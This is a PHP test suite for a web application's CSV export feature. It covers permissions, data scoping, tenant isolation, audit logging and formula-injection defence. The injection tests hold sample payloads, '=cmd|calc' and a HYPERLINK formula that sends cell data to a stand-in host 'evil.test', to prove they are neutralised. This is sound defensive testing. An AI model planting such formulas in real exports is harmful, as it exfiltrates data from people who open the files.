<?php

declare(strict_types=1);

use App\Domain\Exporting\CsvWriter;
use App\Domain\Exporting\ExportRegistry;
use App\Enums\CompanyRole;
use App\Enums\DataScope;
use App\Models\AuditLog;
use App\Models\Company;
use App\Models\Customer;
use App\Models\Order;
use App\Services\Access\RoleProvisioner;
use App\Support\PermissionRegistry;
use Database\Seeders\ModuleSeeder;
use Database\Seeders\PermissionSeeder;

beforeEach(function (): void {
    $this->seed(PermissionSeeder::class);
    $this->seed(ModuleSeeder::class);
});

function csvOf($response): array
{
    $body = $response->streamedContent();
    $body = str_replace("\xEF\xBB\xBF", '', $body);

    $rows = array_map('str_getcsv', array_filter(explode("\n", trim($body)), fn ($l): bool => trim($l) !== ''));

    return ['headings' => array_shift($rows), 'rows' => $rows];
}

it('refuses an export to a role without the export ability', function (): void {
    $f = routeFixture();

    grant($f['company'], CompanyRole::Salesperson, 'customers.view', DataScope::Company);

    // The salesperson may browse every customer. Taking the whole list out of the
    // building is a separate decision, and a separate permission.
    $this->actingAs($f['alice'])->get('/exports/customers')->assertForbidden();
});

it('gives an accountant the customer list as CSV', function (): void {
    $f = routeFixture();

    $accountant = person($f['company'], CompanyRole::Accountant, 'books@acme.test', $f['branch']);
    grant($f['company'], CompanyRole::Accountant, 'customers.view', DataScope::Company);
    grant($f['company'], CompanyRole::Accountant, 'customers.export', DataScope::Company);

    $this->withCompany($f['company'], function (): void {
        Customer::create(['code' => 'CU-1', 'name' => 'Alpha Sdn Bhd', 'email' => 'a@alpha.test']);
        Customer::create(['code' => 'CU-2', 'name' => 'Beta Trading', 'email' => 'b@beta.test']);
    });

    $response = $this->actingAs($accountant)->get('/exports/customers');

    $response->assertOk()
        ->assertHeader('content-type', 'text/csv; charset=UTF-8')
        ->assertDownload('customers-'.now()->format('Y-m-d').'.csv');

    $csv = csvOf($response);

    expect($csv['headings'])->toContain('Code', 'Name', 'Email')
        ->and($csv['rows'])->toHaveCount(2)
        ->and($csv['rows'][0][1])->toBe('Alpha Sdn Bhd');
});

it('exports only what the data scope allows, not the whole company', function (): void {
    $f = routeFixture();

    // Alice and Bob are both salespeople. Each owns one order.
    $this->withCompany($f['company'], function () use ($f): void {
        foreach ([['SO-A', $f['alice']], ['SO-B', $f['bob']]] as [$number, $owner]) {
            Order::create([
                'order_number' => $number,
                'owner_user_id' => $owner->getKey(),
                'branch_id' => $f['branch']->getKey(),
                'customer_name' => 'Buyer',
                'placed_at' => now(),
            ]);
        }
    });

    grant($f['company'], CompanyRole::Salesperson, 'orders.view', DataScope::Own);
    grant($f['company'], CompanyRole::Salesperson, 'orders.export', DataScope::Own);

    $csv = csvOf($this->actingAs($f['alice'])->get('/exports/orders')->assertOk());

    // This is the clause P1's exit gate has always claimed: a salesperson cannot reach
    // another's record "via route, export, report or API".
    expect($csv['rows'])->toHaveCount(1)
        ->and($csv['rows'][0][0])->toBe('SO-A');
});

it('widens the same export when the scope is widened', function (): void {
    $f = routeFixture();

    $this->withCompany($f['company'], function () use ($f): void {
        foreach ([['SO-A', $f['alice']], ['SO-B', $f['bob']]] as [$number, $owner]) {
            Order::create([
                'order_number' => $number,
                'owner_user_id' => $owner->getKey(),
                'branch_id' => $f['branch']->getKey(),
                'customer_name' => 'Buyer',
                'placed_at' => now(),
            ]);
        }
    });

    grant($f['company'], CompanyRole::Salesperson, 'orders.view', DataScope::Company);
    grant($f['company'], CompanyRole::Salesperson, 'orders.export', DataScope::Company);

    $csv = csvOf($this->actingAs($f['alice'])->get('/exports/orders')->assertOk());

    expect($csv['rows'])->toHaveCount(2);
});

it('never exports another company\'s records', function (): void {
    $f = routeFixture();

    $other = Company::create(['name' => 'Beta Sdn Bhd', 'slug' => 'beta-'.str()->random(6)]);
    app(RoleProvisioner::class)->provision($other);

    $this->withCompany($other, fn () => Customer::create(['code' => 'X-1', 'name' => 'Should Never Appear']));
    $this->withCompany($f['company'], fn () => Customer::create(['code' => 'CU-1', 'name' => 'Ours']));

    grant($f['company'], CompanyRole::Salesperson, 'customers.view', DataScope::Company);
    grant($f['company'], CompanyRole::Salesperson, 'customers.export', DataScope::Company);

    $body = $this->actingAs($f['alice'])->get('/exports/customers')->assertOk()->streamedContent();

    expect(str_contains($body, 'Ours'))->toBeTrue()
        ->and(str_contains($body, 'Should Never Appear'))->toBeFalse();
});

it('records every export in the audit log', function (): void {
    $f = routeFixture();

    grant($f['company'], CompanyRole::Salesperson, 'customers.view', DataScope::Company);
    grant($f['company'], CompanyRole::Salesperson, 'customers.export', DataScope::Company);

    $this->withCompany($f['company'], fn () => Customer::create(['code' => 'CU-1', 'name' => 'Alpha']));

    $this->actingAs($f['alice'])->get('/exports/customers')->assertOk()->streamedContent();

    $entry = AuditLog::acrossCompanies()->where('action', 'exported')->first();

    // Taking a copy of the customer list out of the building is exactly the event an
    // auditor would want to see, and reads are otherwise not recorded anywhere.
    expect($entry)->not->toBeNull()
        ->and($entry->module)->toBe('customers')
        ->and($entry->actor_user_id)->toBe($f['alice']->getKey())
        ->and($entry->reason)->toContain('1 row(s)');
});

it('answers 404 for an export that does not exist', function (): void {
    $f = routeFixture();

    $this->actingAs($f['owner'])->get('/exports/salaries-and-secrets')->assertNotFound();
});

it('neutralises a cell that a spreadsheet would run as a formula', function (): void {
    $writer = app(CsvWriter::class);

    foreach (['=cmd|calc', '+1+1', '-2+3', '@SUM(A1)', "\tTAB"] as $dangerous) {
        expect($writer->neutralise($dangerous))->toStartWith("'");
    }

    expect($writer->neutralise('Alpha Sdn Bhd'))->toBe('Alpha Sdn Bhd')
        ->and($writer->neutralise('100.00'))->toBe('100.00');
});

it('neutralises a formula that arrived through a customer name', function (): void {
    $f = routeFixture();

    grant($f['company'], CompanyRole::Salesperson, 'customers.view', DataScope::Company);
    grant($f['company'], CompanyRole::Salesperson, 'customers.export', DataScope::Company);

    $this->withCompany($f['company'], fn () => Customer::create([
        'code' => 'CU-1',
        'name' => '=HYPERLINK("http://evil.test?d="&A1,"click")',
    ]));

    $body = $this->actingAs($f['alice'])->get('/exports/customers')->assertOk()->streamedContent();

    // Opening the file must not be enough to run this.
    expect(str_contains($body, '"\'=HYPERLINK'))->toBeTrue($body);
});

it('starts the file with a byte order mark so Excel reads it as UTF-8', function (): void {
    $f = routeFixture();

    grant($f['company'], CompanyRole::Salesperson, 'customers.view', DataScope::Company);
    grant($f['company'], CompanyRole::Salesperson, 'customers.export', DataScope::Company);

    $this->withCompany($f['company'], fn () => Customer::create(['code' => 'CU-1', 'name' => 'Zulkifli bin Añez']));

    $body = $this->actingAs($f['alice'])->get('/exports/customers')->assertOk()->streamedContent();

    expect(str_starts_with($body, "\xEF\xBB\xBF"))->toBeTrue('no BOM, so Excel mangles non-ASCII names')
        ->and(str_contains($body, 'Añez'))->toBeTrue();
});

it('offers a role only the exports it may actually run', function (): void {
    $f = routeFixture();

    grant($f['company'], CompanyRole::Salesperson, 'customers.export', DataScope::Company);

    $offered = $this->withCompany(
        $f['company'],
        fn (): array => collect(app(ExportRegistry::class)->availableTo($f['alice']))->pluck('key')->all()
    );

    expect($offered)->toBe(['customers']);
});

it('checks that every export it offers actually resolves', function (): void {
    $registry = app(ExportRegistry::class);

    expect($registry->all())->not->toBeEmpty();

    foreach ($registry->all() as $key => $definition) {
        expect(class_exists($definition->model))->toBeTrue("{$key} names a model that does not exist");
        // toContain treats a second argument as another needle, not as a message.
        expect(in_array($definition->ability, PermissionRegistry::all(), true))->toBeTrue(
            "{$key} needs the ability {$definition->ability}, which is not in the permission registry"
        );
        expect($definition->columns)->not->toBeEmpty("{$key} exports no columns");
    }
});
